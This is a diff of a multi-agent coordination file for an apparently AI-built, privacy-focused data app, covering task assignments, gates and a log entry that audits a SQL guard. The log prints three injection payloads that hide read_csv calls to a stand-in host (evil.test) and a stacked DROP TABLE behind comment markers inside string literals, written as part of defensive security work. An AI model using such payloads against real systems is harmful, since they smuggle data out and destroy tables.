@@ -1,98 +1,170 @@
 # COLLAB — Airlock multi-agent coordination
 
-Three agents write to this repo. **This file is the shared channel.** Claude and
-Kiro cannot message each other directly, so: read this file before you start
-work, append to the Message Log when you need the others to know something.
+**This file is the shared channel.** Read it before you start work; append to the
+Message Log when the others need to know something.
 
-Last updated: 2026-09-01
+Last updated: 2026-09-02 · Mission: `docs/NORTH_STAR.md` · Plan: `docs/BUILD_PROMPT.md`
+
+> **Mission changed on 2026-09-02.** The hackathon deadline is no longer the
+> driver. We are building the product described in `docs/NORTH_STAR.md`:
+> *the verifiable way to let AI work with data you can't share.* Read
+> `NORTH_STAR.md` for the why and `BUILD_PROMPT.md` for the what — in that order —
+> before touching code. Nothing below overrides those two documents.
+
+> **Naming note:** earlier entries in this log say `master`. The branch is and
+> always was **`main`**. Read `master` as `main` throughout.
 
 ---
 
 ## The agents
 
-| Agent | Who | How to reach it |
+`kiro` is **unavailable**. `claude-main` is the dispatcher and the only agent
+that merges. Work is executed by task-scoped subagents, one branch each.
+
+| Agent | Role | Reach |
 | --- | --- | --- |
-| **claude-main** | Claude Code session `openai-webmcp-cb` | Append to Message Log; the human relays |
-| **claude-engine** | Claude Code session `openai-webmcp-17` | Cross-session message, or Message Log |
-| **kiro** | Kiro CLI (specs in `.kiro/specs/`) | Append to Message Log; the human relays |
+| **claude-main** | Dispatcher. Owns branch topology, runs every merge, runs `/code-review high` + `/graphify . --update` per tier, writes this file. Does not implement features. | this session |
+| **stream subagents** | One task each (`T0-c`, `T1-a`, …). Own only their stream's files. Cannot merge. Report green gates back to claude-main. | spawned per task |
+| ~~kiro~~ | Unavailable. Its open work (`feat/data-io`) already landed on `main` by another path. | — |
+
+### Stream workspaces
+
+The seven `airlock-wt-*` directories are **no longer feature parking** — every
+branch they held is merged into `main`. They are now **pre-built workspaces**
+(each has a warm `node_modules`) reassigned to live streams, so a subagent can
+run the full gate suite without an `npm install`.
+
+| Workspace | Stream | Branch |
+| --- | --- | --- |
+| `openai_webmcp/` (primary) | claude-main — integration + merges | `main` |
+| `airlock-wt-dataio` | T0-c SQL guard | `fix/sql-guard-lexer` |
+| `airlock-wt-int2` | T0-d deploy verification | `chore/deploy-verify` |
+| `airlock-wt-persistence` | T1-a local model runtime | `feat/local-model-runtime` |
+| `airlock-wt-recipes` | T1-b local agent loop | `feat/local-agent-loop` |
+| `airlock-wt-citations` | T1-c model-download UX | `feat/local-model-ux` |
+| `airlock-wt-redaction` | T1-d agent mode + honest status | `feat/agent-mode` |
+| `airlock-wt-integration` | T2.1 trust receipt | `feat/attestation` |
+
+**Do not `cd` outside your assigned workspace.** Two branches cannot be checked
+out in one worktree; staying put is what makes the parallelism safe.
 
 ---
 
 ## Hard rules
 
-1. **Git is now live.** Baseline commit `48380c8`. Never work directly on
-   `master`. One branch per stream (names below). Merge to `master` only when
-   `npm run build` + `npm run typecheck --workspace apps/airlock` + `npm test`
-   all pass.
-2. **Stay in your files.** The ownership map below is binding. If you must touch
-   another agent's file, append a note to the Message Log *first* and wait.
-3. **The non-negotiables still hold** (see `CLAUDE.md`): base table immutable,
-   honest read/write tool split, zero egress, polyfill never shadows a native
-   host, every tool call hits the activity ledger, `webmcp-staged` extended not
-   rewritten.
-4. **Submission beats features.** Deadline is **Sept 3, 1pm PT**. If a feature
-   branch is not green and merged by **Sept 2 18:00 IST**, it is abandoned, not
-   rushed. A broken submission scores zero.
-5. Append to the Message Log, never rewrite another agent's entry.
+1. **Never commit to `main`.** One branch per stream, branched from `main`.
+   Only claude-main merges, and only after gates are green and the diff is
+   reviewed.
+2. **Gates, all three, on your branch, before you report done:**
+   ```
+   npm run build
+   npm run typecheck --workspace apps/airlock
+   npm test
+   ```
+   Report the actual numbers (test counts, failures). "Should pass" is not a
+   result. A red gate is a finding, not a delay — report it immediately.
+3. **Stay in your files.** The ownership map is binding. Need a file you don't
+   own? Append to the Message Log and stop — claude-main resolves it.
+4. **The non-negotiables hold** (`CLAUDE.md` §Non-negotiable conventions and
+   `BUILD_PROMPT.md` §Guardrails): base table immutable, honest read/write tool
+   split, zero egress, polyfill never shadows a native host, every tool call
+   hits the activity ledger, `webmcp-staged` extended never rewritten.
+5. **Never state a privacy claim the ledger or egress monitor can contradict.**
+   This is the whole brand. One dishonest claim burns it. If a cloud model is
+   active, the UI says so in plain language.
+6. Append to the Message Log; never rewrite another agent's entry.
+7. Never `git reset`/`rebase`/force-move `main`. (See the 2026-09-01 rewind.)
+
+---
+
+## Task board
+
+Status: ✅ done · 🔵 in flight · ⚪ queued · 🔴 blocked
+
+### Tier 0 — baseline integrity
+
+| ID | Task | Owner | Branch | Status |
+| --- | --- | --- | --- | --- |
+| T0-a | Data I/O — Parquet, TSV, clipboard, FS-Access picker | (landed) | — | ✅ on `main` `3d008a8`; `.xlsx` deliberately removed (`e50709d`, two unpatched SheetJS advisories in the untrusted-parse path) |
+| T0-b | Land persistence · recipes · citations · redaction | claude-main | — | ✅ already ancestors of `main` (`3ae7b0f`, `eb705bd`) — reduced to a green-gate re-verification |
+| T0-c | SQL guard: comment/string ordering bypass + tests | subagent | `fix/sql-guard-lexer` | 🔵 |
+| T0-d | Deploy verification: COOP/COEP, WASM MIME, SPA redirect, cold-load Seal = 0 | subagent | `chore/deploy-verify` | 🔵 |
+
+### Tier 1 — fully-local agent (the headline build)
+
+| ID | Task | Owner | Branch | Depends on |
+| --- | --- | --- | --- | --- |
+| T1-a | WebLLM runtime + self-hosted weights + `LocalModelStore` | subagent | `feat/local-model-runtime` | T0 green |
+| T1-b | Local agent loop — WebMCP client, tool-calling, propose → wait → resume | subagent | `feat/local-agent-loop` | **T1-a** |
+| T1-c | Model-download UX — consent, progress, hardware check, cache management | subagent | `feat/local-model-ux` | T0 green (parallel) |
+| T1-d | Agent mode + honest status — `agentMode.ts`, Seal, WebMCPStatus | subagent | `feat/agent-mode` | T0 green (parallel) |
+
+### Tier 2 — the moat
+
+| ID | Task | Owner | Branch | Depends on |
+| --- | --- | --- | --- | --- |
+| T2.1 | Verifiable trust receipt — signed data-handling attestation + verify page | subagent | `feat/attestation` | Tier 1 |
+| T2.2 | Redaction × local model = provable blindfolding | — | — | T2.1 |
+| T2.3 | Provenance-linked reports | — | — | T2.1 |
+| T2.4 | Local multi-source (folder, localhost proxy, Sheet) | — | — | T2.1 |
 
 ---
 
 ## Ownership map
 
-### Submission-critical (highest priority, blocks everything)
+A stream owns its files exclusively for the life of the stream. Overlaps are
+listed explicitly because they are where integration bugs are born.
 
-| Item | Owner | Status |
-| --- | --- | --- |
-| Netlify deploy + live URL | **human** | not started |
-| Screenshots (real captures) | **human** | placeholders in place |
-| Demo video (<3 min) | **human** | script ready |
-| Devpost form | **human** | copy ready in `submission/` |
-| submission-hardening spec | **kiro** | in progress |
+| Stream | Owns |
+| --- | --- |
+| **T0-c** | `engine/duckdb.ts` (guard half only — `assertNoAbuse` / `assertSelectOnly` / `assertExpression` / `stripComments` / `neutralizeStrings`), `engine/__tests__/sqlGuard.test.ts` |
+| **T0-d** | `netlify.toml`, `apps/airlock/public/_headers`, `DEPLOY.md`, `vite.config.ts` (headers/build only) |
+| **T1-a** | `agent/localModel/runtime.ts`, `localModel/models.ts`, `localModel/store.ts` (all new), `apps/airlock/package.json` (the WebLLM dep) |
+| **T1-b** | `agent/localModel/agent.ts`, `localModel/systemPrompt.ts` (new) |
+| **T1-c** | `components/LocalModelPanel.tsx`, `components/ModelDownloadDialog.tsx` (new) |
+| **T1-d** | `agent/agentMode.ts` (new), `components/SealStatus.tsx`, `components/WebMCPStatus.tsx` |
+| **T2.1** | `lib/attestation.ts`, `lib/signing.ts`, `components/AttestationPanel.tsx`, `public/verify.html` (all new) |
+| **claude-main** | `COLLAB.md`, `README.md`, `LICENSE`, `docs/`, `submission/`, all merges |
 
-### Feature streams (the 5 "real product" features)
+**Known overlaps — coordinate through claude-main, do not resolve unilaterally:**
 
-| # | Feature | Branch | Owner | Primary files |
-| --- | --- | --- | --- | --- |
-| 1 | Persistence (named sessions, IndexedDB) | `feat/persistence` | **claude-main** | `src/lib/persistence.ts` (new), `src/components/SessionMenu.tsx` (new), thin hooks into stores |
-| 2 | Recipes (save/replay approved transforms) | `feat/recipes` | **claude-main** | `src/lib/recipes.ts` (new), `src/components/RecipePanel.tsx` (new) |
-| 3 | Citations (clickable claims in reports) | `feat/citations` | **claude-main** (reassigned) | `agent/tools.tsx`, `agent/reports.ts`, `agent/activity.ts`, `components/ReportPanel.tsx` |
-| 4 | Redaction (per-column blindfold + PII flags) | `feat/redaction` | **claude-main** (reassigned) | `agent/tools.tsx`, `engine/duckdb.ts` (guard side), `engine/datasetStore.ts`, `components/ColumnList.tsx` |
-| 5 | Real data in/out (xlsx, parquet, clipboard, FS Access) | `feat/data-io` | **kiro** | `engine/loadFile.ts`, `engine/duckdb.ts` (import paths only), `components/FileDrop.tsx`, `lib/csv.ts` |
-
-### Standing ownership (outside the feature streams)
-
-- **claude-main**: `README.md`, `LICENSE`, `DEPLOY.md`, `netlify.toml`,
-  `apps/airlock/public/_headers`, `submission/`, `docs/`, `src/index.css`,
-  `tailwind.config.js`, `MobileGate.tsx`, `useJustAdded.ts`, this file.
-- **claude-engine**: `src/engine/**`, `src/agent/**`, and the core components
-  (DataGrid, ColumnList, ChartPanel, ReportPanel, ReviewPanel, ProposalCard,
-  ActivityLog, RightRail, AgentConsole, CenterTabs, FilterBar, DatasetSwitcher,
-  LeftRail, SealStatus, WebMCPStatus, Sparkline, EmptyState, FileDrop, TopBar).
-- **kiro**: `.kiro/**`, `**/__tests__/**`, `vitest.config.ts`,
-  `docs/screenshots/gen-placeholders.mjs`, `LoadingIndicator.tsx`, and the
-  code-splitting config in `vite.config.ts`.
-
-**Known overlap to watch:** feature 4 and feature 5 both touch
-`engine/duckdb.ts`. claude-engine takes the guard/redaction side; kiro takes the
-import side. Coordinate in the log before either lands.
+- `engine/uiStore.ts` — T1-c (panel state) and T1-d (mode state). Additive
+  fields only; no restructuring of existing state.
+- `components/TopBar.tsx` — T1-c adds the local-model entry point, T1-d touches
+  the Seal/status area. T1-c lands first; T1-d rebases.
+- `agent/tools.tsx` — **frozen for Tier 1.** T1-b reads the tool list from
+  `document.modelContext`, it does not modify the registration surface. If T1-b
+  believes it needs a change here, it stops and reports.
+- `main.tsx` — the egress monitor must stay the first import. Any stream adding
+  init code appends after it, never before.
 
 ---
 
 ## Feature acceptance criteria
 
-Each stream is done when it is demoable in one sentence and green on CI checks.
+Shipped means demoable in one sentence *and* green on all three gates.
 
-1. **Persistence** — reload the tab and the workspace, filters, derived columns,
-   charts, reports and ledger are all still there. Named sessions listable and
-   switchable. Nothing written to the network.
-2. **Recipes** — export the approved transform sequence as a `.json` recipe,
-   load a fresh CSV, replay it in one click, and the same view is reconstructed.
-3. **Citations** — a claim in an agent report links to the exact ledger entry
-   (query + result) that produced it; clicking it opens that entry.
-4. **Redaction** — mark a column redacted; read tools return `null`/aggregate
-   only for it and the attempt is logged; the agent cannot recover the values.
-5. **Data I/O** — load `.xlsx` and `.parquet` and pasted clipboard TSV; export
-   the current view to `.xlsx` as well as `.csv`.
+| # | Done when |
+| --- | --- |
+| **T0-c** | A crafted `run_sql` that hides `read_csv('http://…')` or a stacked `; DROP` behind a comment marker inside a string literal is **rejected**; legitimate queries containing `--`, `/*`, `*/` or a URL-shaped value inside a string still pass; property tests cover both directions. |
+| **T0-d** | Cold load of the built app serves the DuckDB worker with correct COOP/COEP and WASM MIME, SPA deep links resolve, and the Seal reads **0 external requests**. |
+| **T1-a** | `LocalModelStore` reports `unavailable → not-downloaded → downloading → ready`; weights are served same-origin; no third-party origin is ever fetched at runtime. |
+| **T1-b** | The local model drives the real WebMCP tools; a `propose_*` **stops** the loop and waits; approving in `ReviewPanel` resumes it; the ledger shows `propose` then `commit` with one `proposalId`; malformed tool output is recovered, not fatal. |
+| **T1-c** | A first-time user reaches "local model ready" from one clear consent panel with a live progress bar, can cancel and resume, and can later delete the weights and see the reclaimed size. |
+| **T1-d** | The active mode is unmistakable: Local says "0 bytes out" and the Seal agrees; Cloud names the host and links to the ledger; no WebGPU disables Local cleanly with a plain-language reason and zero console errors. |
+| **T2.1** | A finished session exports a signed receipt; the offline verify page confirms signature + hash chain; editing any field breaks verification; **no raw cell value ever appears in the receipt**. |
+
+---
+
+## Per-tier ritual (claude-main runs this, not the streams)
+
+After every tier:
+
+1. All three gates green on `main` post-merge.
+2. `/code-review high` on the tier's cumulative diff.
+3. `/graphify . --update`.
+4. Update `docs/NORTH_STAR.md` §7 status.
+5. Append the result — including what the review found — to the Message Log.
 
 ---
 
@@ -794,3 +866,91 @@ PT. Live URL: none. Demo video: none. Real screenshots: none (placeholders only)
 Devpost form: not submitted. Five features and 248 green tests are worth zero
 points until a judge can open a URL and watch a video. All four remaining items
 are human-owned.
+
+
+### [2026-09-02] claude-main — 🎯 mission changed; this file rewritten; T0 re-scoped
+
+The deadline is no longer the driver. `docs/NORTH_STAR.md` and
+`docs/BUILD_PROMPT.md` land with this commit and supersede the "ship the
+submission" framing that ran through every entry above. Everything below this
+line in the log is history, kept verbatim; everything above the Message Log
+heading is the new operating model.
+
+**What changed structurally:** kiro is unavailable. claude-main is now a
+dispatcher that implements nothing and merges everything. Work runs as
+task-scoped subagents, one branch each, gates green + diff reviewed before I
+merge.
+
+**The seven `airlock-wt-*` worktrees were re-purposed rather than deleted.**
+Every branch they held (`feat/persistence`, `feat/recipes`, `feat/citations`,
+`feat/redaction`, `feat/data-io`, `integration`, `integration-2`) is already an
+ancestor of `main` — they were parking lots for work that has landed. Each has a
+warm `node_modules`, which is worth more than a clean `git worktree list`: a
+subagent can run the full gate suite in one immediately, with no install. They
+are now the stream workspaces in the table above.
+
+**T0-b was already done.** `git rev-list --left-right --count` says all four
+"parked" branches have **zero** commits not in `main`; persistence, recipes and
+citations landed at `3ae7b0f`, redaction at `eb705bd`. There was nothing to
+merge. T0-b is therefore a green-gate re-verification of `main`, not a merge.
+
+**T0-a was already done too, and better than planned.** Data I/O landed at
+`3d008a8`. `.xlsx` was then deliberately **removed** at `e50709d`: `xlsx@0.18.5`
+carries two unpatched high-severity advisories (prototype pollution, ReDoS) with
+no npm fix, and the vulnerable code sat directly in the untrusted-file parse
+path. Shipping it would have contradicted the product's core promise. Parquet,
+TSV, clipboard and the FS-Access picker cover the need with **zero** new
+dependencies. `BUILD_PROMPT.md` Tier 0 still lists XLSX import — treat that line
+as superseded by this decision; the doc is aspirational, the advisory is real.
+
+🔴 **T0-c is more serious than `BUILD_PROMPT.md` describes — and the documented
+hole is the wrong one.**
+
+The doc says: *"the 'networkish string in a SQL comment' bypass — strip comments
+before pattern checks."* But `main` **already** strips comments before the
+`NETWORKISH` and `FORBIDDEN_TOKENS` checks, and a URL sitting inside a comment is
+inert to DuckDB anyway. That is a non-issue.
+
+The actual defect is the **ordering of the two neutralization passes**.
+`assertNoAbuse` calls `stripComments(...)` *before* `neutralizeStrings(...)`, and
+the two are independent regex passes over the whole fragment. So a comment marker
+that lives **inside a string literal** deletes live SQL from the scan copy — while
+the original, unmodified string is what actually reaches `conn.query()`.
+
+Three payloads confirmed accepted against `main`'s guard:
+
+```
+A  SELECT * FROM dataset WHERE note = 'a--'
+     AND x = (SELECT 1 FROM read_csv('http://evil.test/x.csv'))
+B  SELECT * FROM dataset WHERE a = '/*'
+     AND b = (SELECT 1 FROM read_csv('http://evil.test/x.csv')) AND c = '*/'
+C  SELECT 1 WHERE 'x--' = 'x--' ; DROP TABLE dataset
+```
+
+A and B are **exfiltration** — DuckDB resolves `read_csv` in its Web Worker,
+below the main-thread egress monitor, so private column values leave in a query
+string while the Seal still reads "0 bytes out". C is a **write**, which breaks
+"the base table is immutable" outright. The control case
+(`SELECT * FROM read_csv('http://evil.test/x.csv')`, no string trickery) is
+correctly rejected, which is why this survived: the guard looks like it works.
+
+**A regex chain cannot fix this** — comments and string literals are mutually
+recursive lexical states and no ordering of independent passes gets both right.
+The fix is a single-pass lexer that walks the fragment once tracking one state
+(plain · single-quoted string · double-quoted identifier · dollar-quoted ·
+line comment · block comment) and emits one neutralized scan copy. Both
+directions need tests: the payloads above must be rejected, and legitimate
+queries containing `--`, `/*`, `*/` or a URL-shaped value **inside a string**
+must still pass.
+
+**Pruning is blocked, not skipped.** `git worktree remove` and the deletion of
+`integration` / `integration-2` were both refused by this session's permission
+classifier. The branches are fully merged and safe to delete; the operation needs
+the human. Re-purposing the worktrees (above) means this blocks nothing.
+`feat/data-io` is likewise stale and safe to delete: its two unique commits are
+the sqlGuard test-determinism fix (already on `main` as `6ac0963`) and the xlsx
+import that `e50709d` deliberately removed.
+
+**Dispatch order from here:** T0-c ∥ T0-d → verify `main` → T1-a → T1-b, with
+T1-c ∥ T1-d alongside → T2.1. `/code-review high` + `/graphify . --update` after
+each tier, logged here.
